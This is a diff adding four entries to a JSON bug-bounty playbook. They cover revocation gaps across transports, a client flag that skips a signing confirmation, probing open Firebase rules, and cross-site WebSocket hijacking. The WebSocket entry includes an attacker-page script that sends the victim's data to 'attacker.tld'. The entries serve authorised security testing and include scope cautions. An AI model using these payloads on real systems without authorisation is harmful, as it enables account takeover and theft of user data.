@@ -8541,6 +8541,50 @@
       "tell": "You are about to write 'the server follows X' or 'X is allowed' on the strength of a result you did not produce with the target's own request shape. Also: any conclusion drawn from two responses that are IDENTICAL - identical results are the weakest possible evidence for a mechanism, because the most common explanation is that the mechanism never ran.",
       "verify": "Build the control so exactly ONE variable differs from the real case, and confirm the control's precondition independently with the target's method (curl -X POST, not a browser tab). Separate reachability from behaviour: a redirector that can also return a plain 200 tells you whether a failure means 'cannot reach you' or 'will not follow you'. Treat an unstructured error ('something went wrong on our side') as NOT A RESULT - it is neither a yes nor a no. Same failure family as a no-op write passing an authz check without ever consulting authorisation.",
       "source": "self:hunt31-resume-2026-08-21"
+    },
+    {
+      "id": "pb0619",
+      "class": "revocation",
+      "stack": "web,api",
+      "difficulty": "low",
+      "technique": "A REVOCATION CONTROL USUALLY COVERS ONE TRANSPORT, NOT ALL OF THEM. 'Revoke session', 'sign out everywhere' and 'delete API key' are implemented in whichever middleware the team was thinking about - typically the REST/HTML path - while the GraphQL endpoint, the WebSocket, the mobile API or the SDK credential keeps accepting the same token. Do not test revocation once; enumerate every transport the product exposes and replay through EACH one after invoking the control.",
+      "payload": "1. authenticate, then capture one request on EVERY surface the app uses:\n     REST/HTML   POST /settings/...\n     GraphQL     POST /graphql {\"query\":\"query Me{...}\"}\n     WebSocket    wss://.../socket   (send a subscribe/start frame)\n     mobile/SDK   the app's own API host, with its bearer\n2. invoke the revoke control (or log out, or delete the key)\n3. replay ALL of them\n\nreal case: revoking a session killed the REST session but the GraphQL query\nstill returned bounty amounts, payout method and report titles. Paid.",
+      "tell": "The product has more than one API surface (REST + GraphQL, or web + mobile, or HTTP + WebSocket) and a user-facing control that claims to end access. The more surfaces, the likelier one was missed.",
+      "verify": "Verdict on an authenticated response containing the user's OWN data, not on a page render. Distinguish the severity honestly (see pb0617): a session merely outliving logout is often dismissed as a stateless-JWT trade-off, but an EXPLICIT 'revoke session' control that leaves one transport live is a shipped feature that does not do what it says - that is the version that gets paid. Say which one you have.",
+      "source": "h1-hacktivity:2026-ingest"
+    },
+    {
+      "id": "pb0620",
+      "class": "privesc",
+      "stack": "web,api,rpc",
+      "difficulty": "low",
+      "technique": "A CLIENT-SUPPLIED BOOLEAN THAT DECIDES WHETHER THE CONFIRMATION STEP RUNS. Distinct from pb0597 (flip a stored setting): here a per-request flag in the caller's own payload gates whether the approval prompt, the ownership check or the signing dialog executes at all. It exists because some internal caller legitimately needed to skip the prompt, and the parameter was never restricted to that caller. Grep the request body and the SDK for any boolean whose name implies a security step, then send it false.",
+      "payload": "params: { enableAuthorize: false, typedDataMessage: {...}, address: \"0x..\" }\n\nserver code:\n  if (enableAuthorize && !(await renderSignMessageUI({...}))) {\n      throw new UserRejectedOpError();\n  }\n  return await signMessageUtil(this.account.privateKey, ...);\n=> caller sets it false -> no dialog -> arbitrary message/transaction signed\n\nnames to grep: enableAuthorize, requireConfirmation, skipConfirm, force,\n  bypassApproval, silent, noPrompt, interactive, validate, checkOwnership,\n  dryRun, skipValidation, adminOverride",
+      "tell": "An RPC/SDK method whose documented options include anything about prompts, confirmation or interactivity. Also any code comment of the form 'set to false to bypass the confirmation' - that comment IS the vulnerability, and it is often sitting in a public repo.",
+      "verify": "Confirm the guarded ACTION actually completed (message signed, funds moved, record changed), not merely that the dialog was absent. Control: with the flag true or omitted, the prompt must appear and the action must be refused when declined - that proves the control exists and that the flag is what defeated it. Use only your own accounts/wallets and never a real signing key.",
+      "source": "h1-hacktivity:2026-ingest"
+    },
+    {
+      "id": "pb0621",
+      "class": "bola",
+      "stack": "baas,firebase,mobile",
+      "difficulty": "low",
+      "technique": "BaaS DATABASE CREDENTIALS ARE MEANT TO BE PUBLIC - THE SECURITY IS THE RULES, SO TEST THE RULES DIRECTLY. Firebase/Firestore config in the page source or an APK's strings.xml is not itself the bug (the apiKey is a project identifier, not a secret). The bug is whether the database accepts unauthenticated reads and writes. Extract the databaseURL / projectId and hit the REST API yourself. Five separate disclosed reports, one identical pattern.",
+      "payload": "find the config:\n  view-source -> firebase-config.js  {apiKey, databaseURL, projectId, storageBucket}\n  APK -> res/values/strings.xml -> <string name=\"firebase_database_url\">\n\nRTDB:\n  GET  https://<project>.firebaseio.com/.json\n  PUT  https://<project>.firebaseio.com/poc.json  -d '{\"probe\":\"<marker>\"}'\nFirestore REST:\n  GET  https://firestore.googleapis.com/v1/projects/<project>/databases/(default)/documents/<col>\n  POST same URL  -d '{\"fields\":{\"probe\":{\"stringValue\":\"<marker>\"}}}'\nalso: storageBucket via the Cloud Storage REST API",
+      "tell": "⭐ THE DECISIVE TELL: `/.json` returning **null** instead of `{\"error\":\"Permission denied\"}` means the rules are open, not that the path is empty. A permission error is the SAFE outcome; null is the finding.",
+      "verify": "Read first. Only then write, to a NEW path you invent (/poc-<marker>.json), never over existing data, and delete it immediately. Do not enumerate or download other people's records - prove the rule gap with your own marker and stop. Report the RULE misconfiguration, not the 'leaked apiKey' - reporting a public identifier as a secret is a standard invalid submission and burns credibility.",
+      "source": "h1-hacktivity:2026-ingest"
+    },
+    {
+      "id": "pb0622",
+      "class": "websockets",
+      "stack": "web,websocket",
+      "difficulty": "low",
+      "technique": "THE WEBSOCKET HANDSHAKE IS A PLAIN HTTP GET THAT SENDS COOKIES AND IS NOT PROTECTED BY THE SAME-ORIGIN POLICY. There is no CORS preflight on a WebSocket upgrade, so unless the server explicitly validates the Origin header, any site can open an authenticated socket as the victim and both send and READ messages - strictly worse than CSRF, which is write-only. In apps that move most traffic over the socket, this is the whole session.",
+      "payload": "attacker page:\n  <script>\n    const ws = new WebSocket(\"wss://target.tld/socket\");\n    ws.onopen  = () => ws.send(JSON.stringify({type:\"start\",payload:{query:\"{ me { id email } }\"}}));\n    ws.onmessage = e => fetch(\"https://attacker.tld/x?d=\"+btoa(e.data));\n  </script>\n\nrelated, same surface: an UNAUTHENTICATED socket that still answers privileged\nframes - e.g. a GraphQL introspection query sent as {type:\"start\",payload:{query:...}}\nwhen the equivalent HTTP endpoint requires auth.",
+      "tell": "wss:// traffic in the capture, or a handshake GET carrying Sec-WebSocket-Key plus session cookies. Check the handshake response for any Origin validation - and separately, whether the socket answers frames BEFORE any auth frame is sent.",
+      "verify": "Verdict on the attacker page RECEIVING the victim's data, not on the socket merely opening. Control: send the same frame from an unauthenticated socket - if it answers there too, the finding is 'unauthenticated socket', which is different and often bigger. Test both the origin check and the pre-auth frame handling; they are separate controls on the same endpoint.",
+      "source": "h1-hacktivity:2026-ingest"
     }
   ]
 }
